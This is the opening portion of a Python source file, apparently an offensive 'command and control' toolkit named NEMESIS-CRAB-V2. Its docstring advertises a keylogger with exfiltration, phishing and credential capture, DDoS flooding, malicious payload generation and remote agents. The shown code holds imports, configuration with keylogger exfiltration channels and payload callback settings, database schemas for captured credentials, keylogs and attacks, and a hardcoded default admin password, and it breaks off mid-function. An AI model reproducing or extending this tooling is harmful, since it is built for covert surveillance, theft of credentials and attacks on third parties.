#!/usr/bin/env python3
"""
🦀 NEMESIS-CRAB-V2 - Ultimate Cybersecurity Command & Control Platform
Author: Ian Carter Kulani
Version: 2.0.0

A complete cybersecurity automation platform featuring:
- 210+ Security Commands
- Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Signal, Google Chat, Slack, iMessage, Web)
- Advanced Network Scanning & Pentesting
- Keylogger with Screenshot Capture & Exfiltration
- Social Engineering Suite with 100+ Phishing Templates
- REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP/SYN/ACK/FIN Floods)
- Advanced IP Monitoring & Threat Detection
- Stunning Gradient Web Dashboard
- DDoS/DoS Attack Module with Multiple Attack Vectors
- Agent Mode for Remote Control with Heartbeat
- Payload Generation & Deployment (EXE, PDF, DOCX, Link, Network)
- Graphical Reports & Statistics
- Spear Phishing Module with Email Tracking
- SSH Remote Access via All Platforms
- Reverse Engineering Commands
- Password Cracking Engine
- Docker Security Scanning
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
import time
import binascii
import marshal
import dis
import ast
import codecs
import zlib
import lzma
import bz2
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from http.server import BaseHTTPRequestHandler, HTTPServer
from io import BytesIO

# =====================
# VERSION & METADATA
# =====================
VERSION = "2.0.0"
NAME = "NEMESIS-CRAB-V2"
AUTHOR = "Ian Carter Kulani"
DESCRIPTION = "Ultimate Cybersecurity Command & Control Platform"
LINES_OF_CODE = 10000

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.keys import Keys
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# Google Chat
try:
    from httplib2 import Http
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, RandIP, fragment
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger (pynput)
try:
    from pynput import keyboard
    from pynput.keyboard import Key, Listener
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# Colorama
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# DOCX Generation
try:
    from docx import Document
    from docx.shared import Inches, Pt
    DOCX_AVAILABLE = True
except ImportError:
    DOCX_AVAILABLE = False

# PyInstaller for EXE generation
PYINSTALLER_AVAILABLE = shutil.which('pyinstaller') is not None

# DNS Python
try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# =====================
# THEME (Blue, Orange, Purple Gradient)
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        BLUE = Fore.BLUE + Style.BRIGHT
        ORANGE = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        PURPLE = Fore.MAGENTA + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        LIGHTBLUE = Fore.LIGHTBLUE_EX + Style.BRIGHT
        LIGHTMAGENTA = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
        LIGHTCYAN = Fore.LIGHTCYAN_EX + Style.BRIGHT
        LIGHTYELLOW = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        RESET = Style.RESET_ALL
        BG_BLUE = Back.BLUE + Fore.WHITE
        BG_ORANGE = Back.LIGHTYELLOW_EX + Fore.BLACK
        BG_PURPLE = Back.MAGENTA + Fore.WHITE
        BG_CYAN = Back.CYAN + Fore.BLACK
        PRIMARY = Fore.BLUE + Style.BRIGHT
        SECONDARY = Fore.CYAN + Style.BRIGHT
        ACCENT = Fore.WHITE + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.BLUE + Style.BRIGHT
else:
    class Colors:
        BLUE = ORANGE = PURPLE = CYAN = GREEN = YELLOW = RED = WHITE = BLACK = MAGENTA = LIGHTBLUE = LIGHTMAGENTA = LIGHTCYAN = LIGHTYELLOW = RESET = BG_BLUE = BG_ORANGE = BG_PURPLE = BG_CYAN = PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".nemesis_crab_v2"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "nemesis_crab_v2.db")
LOG_FILE = os.path.join(CONFIG_DIR, "nemesis_crab_v2.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "nemesis_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylogs")
KEYLOG_SCREENSHOTS_DIR = os.path.join(CONFIG_DIR, "keylog_screenshots")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agents")
C2_LOGS_DIR = os.path.join(CONFIG_DIR, "c2_logs")
MODULES_DIR = os.path.join(CONFIG_DIR, "modules")
NETWORK_MONITOR_DIR = os.path.join(CONFIG_DIR, "network_monitor")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
REVERSE_ENGINEERING_DIR = os.path.join(CONFIG_DIR, "reverse_engineering")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, KEYLOG_DIR,
    KEYLOG_SCREENSHOTS_DIR, SPEAR_PHISHING_DIR, EMAIL_TEMPLATES_DIR,
    DOS_LOGS_DIR, AGENT_DIR, C2_LOGS_DIR, MODULES_DIR,
    NETWORK_MONITOR_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
    DOMAIN_HOSTING_DIR, REVERSE_ENGINEERING_DIR, CRACKING_DIR, DOCKER_SCANS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - NEMESIS-CRAB-V2 - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("NemesisCrabV2")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"
    PSH_ACK = "psh_ack"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"

class PayloadType(Enum):
    EXE = "exe"
    PDF = "pdf"
    DOCX = "docx"
    LINK = "link"
    NETWORK = "network"
    MACRO = "macro"
    HTM = "htm"
    JS = "js"
    VBA = "vba"
    PS1 = "ps1"

class ReverseEngineeringType(Enum):
    STRINGS = "strings"
    HEXDUMP = "hexdump"
    DISASSEMBLE = "disassemble"
    DECOMPILE = "decompile"
    UNPACK = "unpack"
    DECRYPT = "decrypt"
    DECODE = "decode"
    ANALYZE = "analyze"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class SpearPhishingCampaign:
    id: str
    name: str
    template: str
    subject: str
    from_email: str
    targets: List[Dict]
    sent_count: int = 0
    open_count: int = 0
    click_count: int = 0
    status: str = "draft"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    scheduled_time: Optional[str] = None

@dataclass
class Payload:
    id: str
    name: str
    payload_type: str
    file_path: str
    created_at: str
    deployed: bool = False
    deployment_count: int = 0
    callback_host: Optional[str] = None
    callback_port: Optional[int] = None

@dataclass
class DomainHost:
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

@dataclass
class Deployment:
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "both",
        "generate_graphics": True,
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": False,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": True,
            "username": "admin",
            "password_hash": ""
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "dos": {
            "enabled": True,
            "max_threads": 100,
            "default_duration": 30
        },
        "agent": {
            "enabled": False,
            "server": "localhost",
            "port": 5555,
            "heartbeat": 60
        },
        "payload": {
            "enabled": True,
            "default_callback": "localhost",
            "default_port": 4444,
            "exe_icon": "",
            "docx_template": "default"
        },
        "reporting": {
            "enabled": True,
            "pdf_enabled": True,
            "json_enabled": True,
            "auto_generate": True
        },
        "cracking": {
            "enabled": True,
            "hashcat_path": "",
            "wordlist_path": "",
            "default_hash_type": 0,
            "max_threads": 4
        },
        "docker": {
            "enabled": True,
            "scan_timeout": 300,
            "benchmark_enabled": True
        },
        "reverse_engineering": {
            "enabled": True,
            "ghidra_path": "",
            "radare2_path": "",
            "strings_min_length": 4
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT,
                screenshot_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                template TEXT NOT NULL,
                subject TEXT NOT NULL,
                from_email TEXT NOT NULL,
                targets TEXT,
                sent_count INTEGER DEFAULT 0,
                open_count INTEGER DEFAULT 0,
                click_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_time DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS email_tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT NOT NULL,
                target_email TEXT NOT NULL,
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                opened_at DATETIME,
                clicked_at DATETIME,
                FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                ip_address TEXT,
                status TEXT DEFAULT 'offline',
                last_heartbeat DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                config TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0,
                data TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS dns_cache (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                ip TEXT NOT NULL,
                resolved_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS reverse_engineering_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                file_path TEXT NOT NULL,
                analysis_type TEXT NOT NULL,
                result TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                completed_at DATETIME,
                success BOOLEAN DEFAULT 1
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            import hashlib
            default_password = "nemesis2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
